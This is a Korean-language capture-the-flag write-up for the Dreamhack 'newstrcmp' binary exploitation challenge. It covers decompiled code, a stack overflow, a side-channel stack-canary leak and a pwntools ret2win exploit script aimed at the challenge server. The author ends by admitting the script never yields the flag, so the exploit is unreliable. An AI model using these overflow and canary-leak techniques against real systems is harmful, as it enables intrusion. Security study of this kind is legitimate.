dreamhack newstrcmp writeup
============


## 1. 코드 분석

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+10h] [rbp-50h]
  int v5; // [rsp+14h] [rbp-4Ch] BYREF
  int v6; // [rsp+18h] [rbp-48h]
  _BYTE buf[2]; // [rsp+1Eh] [rbp-42h] BYREF
  _BYTE v8[16]; // [rsp+20h] [rbp-40h] BYREF
  __int64 v9; // [rsp+30h] [rbp-30h]
  __int64 v10; // [rsp+38h] [rbp-28h]
  _BYTE v11[24]; // [rsp+40h] [rbp-20h] BYREF
  unsigned __int64 v12; // [rsp+58h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  v9 = 0;
  v10 = 0;
  v4 = 0;
  setup(argc, argv, envp);
  puts("Tester for newstrcmp");
  while ( 1 )
  {
    printf("Trial: %d\n", ++v4);
    printf("Exit? (y/n): ");
    read(0, buf, 2u);
    if ( buf[0] == 121 )
      break;
    printf("Input string s1: ");
    read(0, v8, 0x40u);
    printf("Input string s2: ");
    read(0, v11, 0x40u);
    newstrcmp(v8, v11, &v5);
    printf("Result of newstrcmp: ");
    if ( v6 )
    {
      if ( v6 >= 0 )
        printf("s1 is larger than s2, first differs at %d\n", v5);
      else
        printf("s1 is smaller than s2, first differs at %d\n", v5);
    }
    else
    {
      puts("Two strings are the same!");
    }
  }
  return 0;
}
```

main 먼저 보면 newstrcmp를 호출하여 결과를 출력하고 있다.    

여기서 read(0, v11, 0x40u) 보면 v11은 24바이트인데 64바이트를 입력받는다. 여기서 스택 카나리(v12)와 리턴 주소를 덮어쓸 수 있는 bof가 발생한다.    


```c
_DWORD *__fastcall newstrcmp(const char *a1, __int64 a2, _DWORD *a3)
{
  int v3; // edx
  _DWORD *result; // rax
  int i; // [rsp+28h] [rbp-8h]
  int v7; // [rsp+2Ch] [rbp-4h]

  v7 = strlen(a1);
  for ( i = 0; ; ++i )
  {
    if ( i >= v7 )
    {
      a3[1] = 0;
      result = a3;
      *a3 = -1;
      return result;
    }
    if ( a1[i] != *(_BYTE *)(i + a2) )
      break;
  }
  if ( a1[i] >= *(_BYTE *)(i + a2) )
    v3 = 1;
  else
    v3 = -1;
  a3[1] = v3;
  result = a3;
  *a3 = i;
  return result;
}
```


newstrcmp 작동은

1. v7 = strlen(a1);: 첫 번째 문자열(s1)의 길이 측정
2. 루프: i를 0부터 v7-1까지 증가시키며 두 문자열의 각 문자 비교
3. 일치할 경우: 루프가 끝까지 돌면 a3[0](v5)에 -1, a3[1](v6)에 0을 저장 (두 문자열이 같음을 의미)
4. 불일치할 경우: 다른 문자가 발견되면 루프를 탈출하고, s1이 크면 1, 작으면 -1을 a3[1] (v6)에 저장 & 그 시점의 인덱스 i를 a3[0] (v5)에 저장

* 특이점: a3를 _DWORD *로 취급하여 a3[0]과 a3[1]에 값을 쓴다. main 함수의 스택에서 연속된 두 4바이트 정수(v5, v6)를 동시에 수정하는 효과가 된다.


## 2. 익스플로잇

### 2.1 익스플로잇 전략

#### 1. 카나리 릭

* newstrcmp 함수는 두 문자열이 어디에서 달라지는지 인덱스(v5)를 알려준다. 이를 이용해 Side-channel 로 카나리를 한 바이트씩 leak할수 있다.
* main 보면 rbp-8인 카나리에 접근이 가능하다. 
* s1에  [24바이트 패딩] + 25번째 바이트에 0x00부터 0xff까지 대입
* s2와 비교해 "두 문자열이 같다" 혹은 "인덱스가 25이다"라는 결과가 나올 때까지 반복하여 카나리 8바이트를 복구한다. 

#### 2. Ret2Win

* 카나리를 알아낸다음에는 v11(s2) 입력 시 발생하는 오버플로우를 이용해 스택을 재구성
* 패딩 (24바이트) + 카나리 (8바이트) + SFP (8바이트) + 플래그 주소 (0x40125b)


## 3. 익스플로잇 코드


```python
from pwn import *

p = remote("host3.dreamhack.games", 12585)
elf = ELF("./newstrcmp") 
context.arch = "amd64"
context.log_level = "DEBUG"

flag_addr = 0x40125b
ret_gadget = 0x40101a 

canary = b"\x00"
print("[*] Starting Canary Brute-force...")

for i in range(7):
    for val in range(0x100):
        p.sendafter(b"(y/n): ", b"n")
        
        # s1은 현재 시도 값 뒤에 더 큰 값(\xff)을 붙임
        test_payload = b"a" * 0x18 + canary + p8(val)
        p.sendafter(b"s1: ", test_payload + b"\xff")
        p.sendafter(b"s2: ", test_payload)
        
        res = p.recvline()
        if b"Result of newstrcmp:" in res and b"differs" not in res:
            canary += p8(val)
            print(f"[+] Found byte {i+1}/7: {hex(val)}")
            break

print(f"[*] Final Canary Found: {canary.hex()}")

# 3. 최종 페이로드 전송 (BOF 실행)
p.sendafter(b"(y/n): ", b"n")

# 스택 구성: [buf: 24] + [canary: 8] + [SFP: 8] + [RET: flag]
payload = b"a" * 0x18 + canary + b"b" * 8 + p64(flag_addr)

p.sendafter(b"s1: ", b"dummy") # s1은 중요하지 않음
p.sendafter(b"s2: ", payload)  # s2를 통해 스택 덮어쓰기

# 4. 루프 탈출 및 결과 확인
print("[*] Sending 'y' to trigger Return Address Overwrite...")
p.sendafter(b"(y/n): ", b"y")

# 5. EOF 방지를 위해 수동으로 데이터 읽기
try:
    # flag 함수가 실행되어 표준 출력으로 flag를 뱉을 때까지 대기
    print("[+] Waiting for flag...")
    flag = p.recvall(timeout=3)
    print(f"\n[!!!] Captured Output:\n{flag.decode()}")
except Exception as e:
    print(f"[-] Error or Timeout: {e}")

p.interactive()
```


그런데 이렇게해도 자꾸 플래그가 안나온다... 인터넷에서 여러 라이트업 찾아봤는데도 그렇다 
